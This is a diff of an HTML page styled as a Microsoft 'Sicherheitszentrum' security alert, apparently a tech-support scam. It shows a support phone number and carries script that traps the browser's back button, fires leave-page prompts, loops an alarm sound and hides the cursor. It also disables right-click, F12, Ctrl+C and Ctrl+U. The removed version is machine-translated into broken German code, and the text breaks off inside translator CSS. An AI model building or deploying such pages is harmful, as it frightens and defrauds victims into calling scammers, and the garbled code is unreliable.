@@ -1,2023 +1,2098 @@
-<!doctype html>
-
-<html lang="de">
-
-<head>
-<!-- Globales Site-Tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-252386984-1"></script>
+<html lang="de" class="translated-ltr"><head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-252386984-1"></script>
 <script>
-window.dataLayer = window.dataLayer || [];
-function gtag(){dataLayer.push(arguments);}
-gtag('js', new Date());
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-gtag('config', 'G-F7ZFZW9VDE');
+  gtag('config', 'G-F7ZFZW9VDE');
 </script>
 
-<meta charset="utf-8">
 
-<meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>Sicherheitscenter</title>
 
-<link rel="stylesheet" type="text/css"
 
-href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
 
-<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    <meta charset="utf-8">
 
-integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<script src="jquery.min.js"></script>
+    <title> Sicherheitszentrum </title>
 
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"
 
-integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
 
-crossorigin="anonymous"></script>
+    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
 
-<script type="text/javascript">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
 
-Funktion getVariableFromURl(Name) {
+    <script src="jquery.min.js"></script>
 
-Name = Name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
 
-var regexS = "[\\?&]" + Name + "=([^&#]*)";
 
-var regex = new RegExp(regexS);
 
-var results = regex.exec(window.location.href);
+    <script type="text/javascript">
 
-if (results == null)
+        function getVariableFromURl(name) {
 
-return "";
+            name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
 
-else
+            var regexS = "[\\?&]" + name + "=([^&#]*)";
 
-return results[1];
+            var regex = new RegExp(regexS);
 
-}
+            var results = regex.exec(window.location.href);
 
-var phone_number = '050-5534-9599 (無料通話)';
+            if (results == null)
 
-var phone_number2 = '050-5534-9599';
+                return "";
 
-</script>
+            else
 
-<script type="text/javascript">
+                return results[1];
 
-window.onbeforeunload = function () {
+        }
 
-if (data_needs_saving()) {
 
-return "Möchten Sie unsere brillante Anwendung wirklich verlassen?";
 
-} else {
+       
 
-return;
+        var phone_number = '050-5534-9599    (無料通話)';
 
-}
+        var phone_number2 = '050-5534-9599';
 
-};
 
-</script>
 
-<script type="text/javascript">
+    </script>
 
-window.addEventListener("beforeunload", function (e) {
+    <script type="text/javascript">
 
-var confirmationMessage = 'Sie scheinen etwas bearbeitet zu haben.'
+        window.onbeforeunload = function () {
 
-+ 'Wenn Sie die Seite vor dem Speichern verlassen, gehen Ihre Änderungen verloren.';
+            if (data_needs_saving()) {
 
-(e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                return "Do you really want to leave our brilliant application?";
 
-return confirmationMessage; //Gecko + WebKit, Safari, Chrome etc.
+            } else {
 
-});
+                return;
 
-</script>
+            }
 
-<style type="text/css">
+        };
 
-.blink {
+    </script>
 
-background-color: #659e1d;
+    <script type="text/javascript">
 
-animation: blink-animation 1s steps(5, start) infinite;
+        window.addEventListener("beforeunload", function (e) {
 
--webkit-animation: blink-animation 1s steps(5, start) infinite;
+            var confirmationMessage = 'It looks like you have been editing something. '
 
-}
+                + 'If you leave before saving, your changes will be lost.';
 
-.blink2 {
 
-background-color: #659e1d;
 
-Animation: Blinkanimation 1s Schritte (5, Start) unendlich;
+            (e || window.event).returnValue = confirmationMessage; //Gecko + IE
 
--webkit-animation: Blinkanimation 1s Schritte (5, Start) unendlich;
+            return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
 
-}
+        });
 
-@keyframes Blinkanimation {
+    </script>
 
-bis {
+    <style type="text/css">
 
-Sichtbarkeit: ausgeblendet;
+        .blink {
 
-}
+            background-color: #659e1d;
 
-}
+            animation: blink-animation 1s steps(5, start) infinite;
 
-@-webkit-keyframes Blinkanimation {
+            -webkit-animation: blink-animation 1s steps(5, start) infinite;
 
-bis {
+        }
 
-Sichtbarkeit: ausgeblendet;
 
-}
 
-}
+        .blink2 {
 
-</style>
+            background-color: #659e1d;
 
-<link href="5f205bb74a5eb_v.css" type="text/css" rel="stylesheet"/>
+            animation: blink-animation 1s steps(5, start) infinite;
 
-<!--<script src=".index_files/jquery.min.js" type="text/javascript"></script>-->
+            -webkit-animation: blink-animation 1s steps(5, start) infinite;
 
-<!--<script type="text/javascript" src="../../bbmaster.js"></script>-->
+        }
 
-<script type="text/javascript">
 
-//Zurück-Schaltfläche
 
-!(function () {
+        @keyframes blink-animation {
 
-var t;
+            to {
 
-try {
+                visibility: hidden;
 
-for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+            }
 
-onpopstate = function (t) {
+        }
 
-t.state && location.replace("#");
 
-};
 
-} catch (o) {
+        @-webkit-keyframes blink-animation {
 
-}
+            to {
 
-})();
+                visibility: hidden;
 
-</script>
+            }
 
-<script>
+        }
 
-var pm_tag = "decpl";
 
-var pm_pid = "11397-dab3c5a4";
 
-</script>
+    </style>
 
-<!-- <script src="5f205bb713507_v.js" async></script>-->
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.8.5/css/froala_style.min.css"/>
 
-<link href="5f205bb63ccd2_v.css" rel="stylesheet"/>
+    <link href="5f205bb74a5eb_v.css" type="text/css" rel="stylesheet">
 
-<link id="anstrexCustomLink" rel="stylesheet" type="text/css" href="5f205bc497791_v.css"/>
+    <!--<script src=".index_files/jquery.min.js" type="text/javascript"></script>-->
 
-<script type="text/javascript">
+    <!--<script type="text/javascript" src="../../bbmaster.js"></script>-->
 
-function myFunction() {
+    <script type="text/javascript">
 
-return "Schreib hier etwas Cleveres...";
+        //backbutton
 
-}
+        !(function () {
 
-</script>
+            var t;
 
-<script type="text/javascript">
+            try {
 
-$(document).ready(function () {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
 
-var audioElement = document.createElement('audio');
+                onpopstate = function (t) {
 
-audioElement.setAttribute('src', 'a0ler0tm0s.mp3');
+                    t.state && location.replace("#");
 
-audioElement.addEventListener('ended', function () {
+                };
 
-this.play();
+            } catch (o) {
 
-}, false);
+            }
 
-$('#map').click(function () {
+        })();
 
-audioElement.play();
+    </script>
 
-});
+    <script>
 
-});
+        var pm_tag = "decpl";
 
-</script>
+        var pm_pid = "11397-dab3c5a4";
 
-<script type="text/javascript">
+    </script>
 
-$(document).keyup(function (evtobj) {
+<!--    <script src="5f205bb713507_v.js" async></script>-->
 
-if (!(evtobj.altKey |
-| evtobj.ctrlKey || evtobj.shiftKey)) {
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.8.5/css/froala_style.min.css">
 
-if (evtobj.keyCode == 16) {
+    <link href="5f205bb63ccd2_v.css" rel="stylesheet">
 
-return false;
+    <link id="anstrexCustomLink" rel="stylesheet" type="text/css" href="5f205bc497791_v.css">
 
-}
+    <script type="text/javascript">
 
-if (evtobj.keyCode == 17) {
+        function myFunction() {
 
-return false;
+            return "Write something clever here...";
 
-}
+        }
 
-$("body").append(evtobj.keyCode + " ");
+    </script>
 
-}
+    <script type="text/javascript">
 
-});
+        $(document).ready(function () {
 
-</script>
+            var audioElement = document.createElement('audio');
 
-<script type="text/javascript">
+            audioElement.setAttribute('src', 'a0ler0tm0s.mp3');
 
-// Rechtsklick deaktivieren
 
-document.addEventListener('contextmenu', event => event.preventDefault());
 
-// F12-Optionen deaktivieren
+            audioElement.addEventListener('ended', function () {
 
-document.onkeypress = function (event) {
+                this.play();
 
-event = (event || window.event);
+            }, false);
 
-if (event.keyCode == 123) {
 
-return false;
 
-}
 
-}
 
-document.onmousedown = Funktion (Ereignis) {
+            $('#map').click(function () {
 
-Ereignis = (Ereignis || Fenster.Ereignis);
+                audioElement.play();
 
-wenn (Ereignis.Schlüsselcode == 123) {
 
-Rückgabe falsch;
 
-}
+            });
 
-}
 
-document.onkeydown = Funktion (Ereignis) {
 
-Ereignis = (Ereignis || Fenster.Ereignis);
 
-wenn (Ereignis.Schlüsselcode == 123) {
 
-Rückgabe falsch;
+        });
 
-}
+    </script>
 
-}
+    <script type="text/javascript">
 
-// So deaktivieren Sie Strg+C und Strg+U
+        $(document).keyup(function (evtobj) {
 
-jQuery(document).ready(function ($) {
+            if (!(evtobj.altKey || evtobj.ctrlKey || evtobj.shiftKey)) {
 
-$(document).keydown(function (event) {
+                if (evtobj.keyCode == 16) {
 
-var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
+                    return false;
 
-if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
+                }
 
-alert('Diese Funktion wurde deaktiviert!');
+                if (evtobj.keyCode == 17) {
 
-//Tastendruckverarbeitung deaktivieren
+                    return false;
 
-return false;
+                }
 
-}
+                $("body").append(evtobj.keyCode + " ");
 
-});
+            }
 
-});
+        });
 
-</script>
+    </script>
 
-</head>
+    <script type="text/javascript">
 
-<body id="map" onbeforeunload="return myFunction()" style="overflow: hidden;cursor: none;">
 
-<div id="chat-box">
 
-<img src="microsoft.jpg"><span style="color: #222;
+        // To disable right click
 
-font-size: 21px;
+        document.addEventListener('contextmenu', event => event.preventDefault());
 
-font-weight: 600;
 
-margin-left: 6px;
 
-position: relative;
+        // To disable F12 options
 
-top: 5px;">Microsoft</span>
+        document.onkeypress = function (event) {
 
-<p style="font-weight: 600;">Verwenden Sie diese Option, um eine Telefonnummer zu erstellen</p>
+            event = (event || window.event);
 
-<h4 style="font-weight: 600;">
+            if (event.keyCode == 123) {
 
-<script>document.write(phone_number);</script>
+                return false;
 
-</h4>
+            }
 
-<div class="arrow-down">
+        }
 
-<i class="fa fa-caret-down"></i>
+        document.onmousedown = function (event) {
+
+            event = (event || window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+        document.onkeydown = function (event) {
+
+            event = (event || window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+
+
+        // To To Disable ctrl+c, ctrl+u
+
+
+
+        jQuery(document).ready(function ($) {
+
+            $(document).keydown(function (event) {
+
+                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
+
+
+
+                if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
+
+                    alert('Sorry, This Functionality Has Been Disabled!');
+
+//disable key press porcessing
+
+                    return false;
+
+                }
+
+            });
+
+        });
+
+
+
+    </script>
+
+
+
+<style type="text/css">/* Copyright 2021 Google Inc. All Rights Reserved. */<br>.goog-te-banner-frame{left:0px;top:0px;height:39px;width:100%;z-index:10000001;position:fixed;border:none;border-bottom:1px solid #6b90da;margin:0;-moz-box-shadow:0 0 8px 1px #999999;-webkit-box-shadow:0 0 8px 1px #999999;box-shadow:0 0 8px 1px #999999;_position:absolute}.goog-te-menu-frame{z-index:10000002;position:fixed;border:none;-moz-box-shadow:0 3px 8px 2px #999999;-webkit-box-shadow:0 3px 8px 2px #999999;box-shadow:0 3px 8px 2px #999999;_position:absolute}.goog-te-ftab-frame{z-index:10000000;border:none;margin:0}.goog-te-gadget{font-family:arial;font-size:11px;color:#666;white-space:nowrap}.goog-te-gadget img{vertical-align:middle;border:none}.goog-te-gadget-simple{background-color:#fff;border-left:1px solid #d5d5d5;border-top:1px solid #9b9b9b;border-bottom:1px solid #e8e8e8;border-right:1px solid #d5d5d5;font-size:10pt;display:inline-block;padding-top:1px;padding-bottom:2px;cursor:pointer;zoom:1;*display:inline}.goog-te-gadget-icon{margin-left:2px;margin-right:2px;width:19px;height:19px;border:none;vertical-align:middle}.goog-te-combo{margin-left:4px;margin-right:4px;vertical-align:baseline;*vertical-align:middle}.goog-te-gadget .goog-te-combo{margin:4px 0}.goog-logo-link,.goog-logo-link:link,.goog-logo-link:visited,.goog-logo-link:hover,.goog-logo-link:active{font-size:12px;font-weight:bold;color:#444;text-decoration:none}.goog-te-banner .goog-logo-link,.goog-close-link{display:block;margin:0px 10px}.goog-te-banner .goog-logo-link{padding-top:2px;padding-left:4px}.goog-te-combo,.goog-te-banner *,.goog-te-ftab *,.goog-te-menu *,.goog-te-menu2 *,.goog-te-balloon *{font-family:arial;font-size:10pt}.goog-te-banner{margin:0;background-color:#e4effb;overflow:hidden}.goog-te-banner img{border:none}.goog-te-banner-content{color:#000}.goog-te-banner-content img{vertical-align:middle}.goog-te-banner-info{color:#666;vertical-align:top;margin-top:0px;font-size:7pt}.goog-te-banner-margin{width:8px}.goog-te-button{border-color:#e7e7e7;border-style:none solid solid none;border-width:0 1px 1px 0}.goog-te-button div{border-color:#cccccc #999999 #999999 #cccccc;border-right:1px solid #999999;border-style:solid;border-width:1px;height:20px}.goog-te-button button{background:transparent;border:none;cursor:pointer;height:20px;overflow:hidden;margin:0;vertical-align:top;white-space:nowrap}.goog-te-button button:active{background:none repeat scroll 0 0 #cccccc}.goog-te-ftab{margin:0px;background-color:#fff;white-space:nowrap}.goog-te-ftab-link{text-decoration:none;font-weight:bold;font-size:10pt;border:1px outset #888;padding:6px 10px;white-space:nowrap;position:absolute;left:0px;top:0px}.goog-te-ftab-link img{margin-left:2px;margin-right:2px;width:19px;height:19px;border:none;vertical-align:middle}.goog-te-ftab-link span{text-decoration:underline;margin-left:2px;margin-right:2px;vertical-align:middle}.goog-float-top .goog-te-ftab-link{padding:2px 2px;border-top-width:0px}.goog-float-bottom .goog-te-ftab-link{padding:2px 2px;border-bottom-width:0px}.goog-te-menu-value{text-decoration:none;color:#0000cc;white-space:nowrap;margin-left:4px;margin-right:4px}.goog-te-menu-value span{text-decoration:underline}.goog-te-menu-value img{margin-left:2px;margin-right:2px}.goog-te-gadget-simple .goog-te-menu-value{color:#000}.goog-te-gadget-simple .goog-te-menu-value span{text-decoration:none}.goog-te-menu{background-color:#ffffff;text-decoration:none;border:2px solid #c3d9ff;overflow-y:scroll;overflow-x:hidden;position:absolute;left:0;top:0}.goog-te-menu-item{padding:3px;text-decoration:none}.goog-te-menu-item,.goog-te-menu-item:link{color:#0000cc;background:#ffffff}.goog-te-menu-item:visited{color:#551a8b}.goog-te-menu-item:hover{background:#c3d9ff}.goog-te-menu-item:active{color:#0000cc}.goog-te-menu2{background-color:#ffffff;text-decoration:none;border:1px solid #6b90da;overflow:hidden;padding:4px}.goog-te-menu2-colpad{width:16px}.goog-te-menu2-separator{margin:6px 0;height:1px;background-color:#aaa;overflow:hidden}.goog-te-menu2-item div,.goog-te-menu2-item-selected div{padding:4px}.goog-te-menu2-item .indicator{display:none}.goog-te-menu2-item-selected .indicator{display:auto}.goog-te-menu2-item-selected .text{padding-left:4px;padding-right:4px}.goog-te-menu2-item,.goog-te-menu2-item-selected{text-decoration:none}.goog-te-menu2-item div,.goog-te-menu2-item:link div,.goog-te-menu2-item:visited div,.goog-te-menu2-item:active div{color:#0000cc;background:#ffffff}.goog-te-menu2-item:hover div{color:#ffffff;background:#3366cc}.goog-te-menu2-item-selected div,.goog-te-menu2-item-selected:link div,.goog-te-menu2-item-selected:visited div,.goog-te-menu2-item-selected:hover div,.goog-te-menu2-item-selected:active div{color:#000;font-weight:bold}.goog-te-balloon{background-color:#ffffff;overflow:hidden;padding:8px;border:none;-moz-border-radius:10px;border-radius:10px}.goog-te-balloon-frame{background-color:#ffffff;border:1px solid #6b90da;-moz-box-shadow:0 3px 8px 2px #999999;-webkit-box-shadow:0 3px 8px 2px #999999;box-shadow:0 3px 8px 2px #999999;-moz-border-radius:8px;border-radius:8px}.goog-te-balloon img{border:none}.goog-te-balloon-text{margin-top:6px}.goog-te-balloon-zippy{margin-top:6px;white-space:nowrap}.goog-te-balloon-zippy *{vertical-align:middle}.goog-te-balloon-zippy .minus{background-image:url(//www.google.com/images/zippy_minus_sm.gif)}.goog-te-balloon-zippy .plus{background-image:url(//www.google.com/images/zippy_plus_sm.gif)}.goog-te-balloon-zippy span{color:#00c;text-decoration:underline;cursor:pointer;margin:0 4px}.goog-te-balloon-form{margin:6px 0 0 0}.goog-te-balloon-form form{margin:0}.goog-te-balloon-form form textarea{margin-bottom:4px;width:100%}.goog-te-balloon-footer{margin:6px 0 4px 0}.goog-te-spinner-pos{z-index:1000;position:fixed;transition-delay:0.6s;left:-1000px;top:-1000px}.goog-te-spinner-animation{background:#ccc;display:flex;align-items:center;justify-content:center;width:104px;height:104px;border-radius:50px;background:#fff url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=) 50% 50% no-repeat;transition:all 0.6s ease-in-out;transform:scale(0.4);opacity:0}.goog-te-spinner-animation-show{transform:scale(0.5);opacity:1}.goog-te-spinner{margin:2px 0 0 2px;animation:goog-te-spinner-rotator 1.4s linear infinite}@keyframes goog-te-spinner-rotator{0%{transform:rotate(0deg)}100%{transform:rotate(270deg)}}.goog-te-spinner-path{stroke-dasharray:187;stroke-dashoffset:0;stroke:#4285f4;transform-origin:center;animation:goog-te-spinner-dash 1.4s ease-in-out infinite}@keyframes goog-te-spinner-dash{0%{stroke-dashoffset:187}50%{stroke-dashoffset:46.75;transform:rotate(135deg)}100%{stroke-dashoffset:187;transform:rotate(450deg)}}#goog-gt-tt html,#goog-gt-tt body,#goog-gt-tt div,#goog-gt-tt span,#goog-gt-tt iframe,#goog-gt-tt h1,#goog-gt-tt h2,#goog-gt-tt h3,#goog-gt-tt h4,#goog-gt-tt h5,#goog-gt-tt h6,#goog-gt-tt p,#goog-gt-tt a,#goog-gt-tt img,#goog-gt-tt ol,#goog-gt-tt ul,#goog-gt-tt li,#goog-gt-tt table,#goog-gt-tt form,#goog-gt-tt tbody,#goog-gt-tt tr,#goog-gt-tt td{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline;text-align:left;line-height:normal}#goog-gt-tt ol,#goog-gt-tt ul{list-style:none}#goog-gt-tt table{border-collapse:collapse;border-spacing:0}#goog-gt-tt caption,#goog-gt-tt th,#goog-gt-tt td{text-align:left;font-weight:normal}#goog-gt-tt input::-moz-focus-inner{border:0}div#goog-gt-tt{padding:10px 14px}#goog-gt-tt{color:#222;background-color:#ffffff;border:1px solid #eee;box-shadow:0 4px 16px rgba(0,0,0,.2);-moz-box-shadow:0 4px 16px rgba(0,0,0,.2);-webkit-box-shadow:0 4px 16px rgba(0,0,0,.2);display:none;font-family:arial;font-size:10pt;width:420px;padding:12px;position:absolute;z-index:10000}#goog-gt-tt .original-text,.gt-hl-layer{clear:both;font-size:10pt;position:relative;text-align:justify;width:100%}#goog-gt-tt .title{color:#999;font-family:arial,sans-serif;margin:4px 0;text-align:left}#goog-gt-tt .close-button{display:none}#goog-gt-tt .logo{float:left;margin:0px}#goog-gt-tt .activity-links{display:inline-block}#goog-gt-tt .started-activity-container{display:none;width:100%}#goog-gt-tt .activity-root{margin-top:20px}#goog-gt-tt .left{float:left}#goog-gt-tt .right{float:right}#goog-gt-tt .bottom{min-height:15px;position:relative;height:1%}#goog-gt-tt .status-message{background:-moz-linear-gradient(top,#29910d 0%,#20af0e 100%);background:-webkit-linear-gradient(top,#29910d 0%,#20af0e 100%);background:-o-linear-gradient(top,#29910d 0%,#20af0e 100%);background:-ms-linear-gradient(top,#29910d 0%,#20af0e 100%);background:linear-gradient(top,#29910d 0%,#20af0e 100%);background:#29910d;border-radius:4px;-moz-border-radius:4px;-webkit-border-radius:4px;box-shadow:inset 0px 2px 2px #1e6609;-moz-box-shadow:inset 0px 2px 2px #1e6609;-webkit-box-shadow:inset 0px 2px 2px #1e6609;color:white;font-size:9pt;font-weight:bolder;margin-top:12px;padding:6px;text-shadow:1px 1px 1px #1e6609}#goog-gt-tt .activity-link{color:#1155cc;cursor:pointer;font-family:arial;font-size:11px;margin-right:15px;text-decoration:none}#goog-gt-tt textarea{font-family:arial;resize:vertical;width:100%;margin-bottom:10px;-webkit-border-radius:1px;-moz-border-radius:1px;border-radius:1px;border:1px solid #d9d9d9;border-top:1px solid silver;font-size:13px;height:auto;overflow-y:auto;padding:1px}#goog-gt-tt textarea:focus{-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,0.3);-moz-box-shadow:inset 0 1px 2px rgba(0,0,0,0.3);box-shadow:inset 0 1px 2px rgba(0,0,0,0.3);border:1px solid #4d90fe;outline:none}#goog-gt-tt .activity-cancel{margin-right:10px}#goog-gt-tt .translate-form{min-height:25px;vertical-align:middle;padding-top:8px}#goog-gt-tt .translate-form .activity-form{margin-bottom:5px;margin-bottom:0px}#goog-gt-tt .translate-form .activity-form input{display:inline-block;min-width:54px;*min-width:70px;border:1px solid #dcdcdc;border:1px solid rgba(0,0,0,0.1);text-align:center;color:#444;font-size:11px;font-weight:bold;height:27px;outline:0;padding:0 8px;vertical-align:middle;line-height:27px;margin:0 16px 0 0;box-shadow:0 1px 2px rgba(0,0,0,.1);-moz-box-shadow:0 1px 2px rgba(0,0,0,.1);-webkit-box-shadow:0 1px 2px rgba(0,0,0,.1);-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;-webkit-transition:all 0.218s;-moz-transition:all 0.218s;-o-transition:all 0.218s;transition:all 0.218s;background-color:#f5f5f5;background-image:-webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));background-image:-webkit-linear-gradient(top,#f5f5f5,#f1f1f1);background-image:-moz-linear-gradient(top,#f5f5f5,#f1f1f1);background-image:-ms-linear-gradient(top,#f5f5f5,#f1f1f1);background-image:-o-linear-gradient(top,#f5f5f5,#f1f1f1);background-image:linear-gradient(top,#f5f5f5,#f1f1f1);-webkit-user-select:none;-moz-user-select:none;cursor:default}#goog-gt-tt .translate-form .activity-form input:hover{border:1px solid #c6c6c6;color:#222;-webkit-transition:all 0.0s;-moz-transition:all 0.0s;-o-transition:all 0.0s;transition:all 0.0s;background-color:#f8f8f8;background-image:-webkit-gradient(linear,left top,left bottom,from(#f8f8f8),to(#f1f1f1));background-image:-webkit-linear-gradient(top,#f8f8f8,#f1f1f1);background-image:-moz-linear-gradient(top,#f8f8f8,#f1f1f1);background-image:-ms-linear-gradient(top,#f8f8f8,#f1f1f1);background-image:-o-linear-gradient(top,#f8f8f8,#f1f1f1);background-image:linear-gradient(top,#f8f8f8,#f1f1f1)}#goog-gt-tt .translate-form .activity-form input:active{border:1px solid #c6c6c6;color:#333;background-color:#f6f6f6;background-image:-webkit-gradient(linear,left top,left bottom,from(#f6f6f6),to(#f1f1f1));background-image:-webkit-linear-gradient(top,#f6f6f6,#f1f1f1);background-image:-moz-linear-gradient(top,#f6f6f6,#f1f1f1);background-image:-ms-linear-gradient(top,#f6f6f6,#f1f1f1);background-image:-o-linear-gradient(top,#f6f6f6,#f1f1f1);background-image:linear-gradient(top,#f6f6f6,#f1f1f1)}#goog-gt-tt .translate-form .activity-form input:focus #goog-gt-tt .translate-form .activity-form input.focus #goog-gt-tt .translate-form .activity-form input:active,#goog-gt-tt .translate-form .activity-form input:focus:active,#goog-gt-tt .translate-form .activity-form input:.focus:active{box-shadow:inset 0 0 0 1px rgba(255,255,255,0.5);-webkit-box-shadow:inset 0 0 0 1px rgba(255,255,255,0.5);-moz-box-shadow:inset 0 0 0 1px rgba(255,255,255,0.5)}#goog-gt-tt .translate-form .activity-form input:focus,#goog-gt-tt .translate-form .activity-form input.focus{outline:none;border:1px solid #4d90fe;z-index:4!important}#goog-gt-tt .translate-form .activity-form input.selected{background-color:#eeeeee;background-image:-webkit-gradient(linear,left top,left bottom,from(#eeeeee),to(#e0e0e0));background-image:-webkit-linear-gradient(top,#eeeeee,#e0e0e0);background-image:-moz-linear-gradient(top,#eeeeee,#e0e0e0);background-image:-ms-linear-gradient(top,#eeeeee,#e0e0e0);background-image:-o-linear-gradient(top,#eeeeee,#e0e0e0);background-image:linear-gradient(top,#eeeeee,#e0e0e0);-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);border:1px solid #ccc;color:#333}#goog-gt-tt .translate-form .activity-form input.activity-submit{color:white;border-color:#3079ed;background-color:#4d90fe;background-image:-webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#4787ed));background-image:-webkit-linear-gradient(top,#4d90fe,#4787ed);background-image:-moz-linear-gradient(top,#4d90fe,#4787ed);background-image:-ms-linear-gradient(top,#4d90fe,#4787ed);background-image:-o-linear-gradient(top,#4d90fe,#4787ed);background-image:linear-gradient(top,#4d90fe,#4787ed)}#goog-gt-tt .translate-form .activity-form input.activity-submit:hover #goog-gt-tt .translate-form .activity-form input.activity-submit:focus,#goog-gt-tt .translate-form .activity-form input.activity-submit.focus #goog-gt-tt .translate-form .activity-form input.activity-submit:active{border-color:#3079ed;background-color:#357ae8;background-image:-webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));background-image:-webkit-linear-gradient(top,#4d90fe,#357ae8);background-image:-moz-linear-gradient(top,#4d90fe,#357ae8);background-image:-ms-linear-gradient(top,#4d90fe,#357ae8);background-image:-o-linear-gradient(top,#4d90fe,#357ae8);background-image:linear-gradient(top,#4d90fe,#357ae8)}#goog-gt-tt .translate-form .activity-form input.activity-submit:hover{box-shadow:inset 0 0 0 1px #fff,0px 1px 1px rgba(0,0,0,0.1);-webkit-box-shadow:inset 0 0 0 1px #fff,0px 1px 1px rgba(0,0,0,0.1);-moz-box-shadow:inset 0 0 0 1px #fff,0px 1px 1px rgba(0,0,0,0.1)}#goog-gt-tt .translate-form .activity-form input:focus,#goog-gt-tt .translate-form .activity-form input.focus,#goog-gt-tt .translate-form .activity-form input:active,#goog-gt-tt .translate-form .activity-form input:hover,#goog-gt-tt .translate-form .activity-form input.activity-submit:focus,#goog-gt-tt .translate-form .activity-form input.activity-submit.focus,#goog-gt-tt .translate-form .activity-form input.activity-submit:active,#goog-gt-tt .translate-form .activity-form input.activity-submit:hover{border-color:#3079ed}#goog-gt-tt .gray{color:#999;font-family:arial,sans-serif}#goog-gt-tt .alt-helper-text{color:#999;font-size:11px;font-family:arial,sans-serif;margin:15px 0px 5px 0px}#goog-gt-tt .alt-error-text{color:#800;display:none;font-size:9pt}.goog-text-highlight{background-color:#c9d7f1;-webkit-box-shadow:2px 2px 4px #9999aa;-moz-box-shadow:2px 2px 4px #9999aa;box-shadow:2px 2px 4px #9999aa;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;position:relative}#goog-gt-tt .alt-menu.goog-menu{background:#ffffff;border:1px solid #dddddd;-webkit-box-shadow:0px 3px 3px #888;-moz-box-shadow:0px 2px 20px #888;box-shadow:0px 2px 4px #99a;min-width:0;outline:none;padding:0;position:absolute;z-index:2000}#goog-gt-tt .alt-menu .goog-menuitem{cursor:pointer;padding:2px 5px 5px;margin-right:0px;border-style:none}#goog-gt-tt .alt-menu div.goog-menuitem:hover{background:#ddd}#goog-gt-tt .alt-menu .goog-menuitem h1{font-size:100%;font-weight:bold;margin:4px 0px}#goog-gt-tt .alt-menu .goog-menuitem strong{color:#345aad}#goog-gt-tt .goog-submenu-arrow{text-align:right;position:absolute;right:0;left:auto}#goog-gt-tt .goog-menuitem-rtl .goog-submenu-arrow{text-align:left;position:absolute;left:0;right:auto}#goog-gt-tt .gt-hl-text,#goog-gt-tt .trans-target-highlight{background-color:#f1ea00;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-moz-box-shadow:rgba(0,0,0,.5) 3px 3px 4px;-webkit-box-shadow:rgba(0,0,0,.5) 3px 3px 4px;box-shadow:rgba(0,0,0,.5) 3px 3px 4px;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;color:#f1ea00;cursor:pointer;margin:-2px -2px -2px -3px;padding:2px 2px 2px 3px;position:relative}#goog-gt-tt .trans-target-highlight{color:#222}#goog-gt-tt .gt-hl-layer{color:white;position:absolute!important}#goog-gt-tt .trans-target,#goog-gt-tt .trans-target .trans-target-highlight{background-color:#c9d7f1;border-radius:4px 4px 0px 0px;-webkit-border-radius:4px 4px 0px 0px;-moz-border-radius:4px 4px 0px 0px;-moz-box-shadow:rgba(0,0,0,.5) 3px 3px 4px;-webkit-box-shadow:rgba(0,0,0,.5) 3px 3px 4px;box-shadow:rgba(0,0,0,.5) 3px 3px 4px;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;cursor:pointer;margin:-2px -2px -2px -3px;padding:2px 2px 3px 3px;position:relative}#goog-gt-tt span:focus{outline:none}#goog-gt-tt .trans-edit{background-color:transparent;border:1px solid 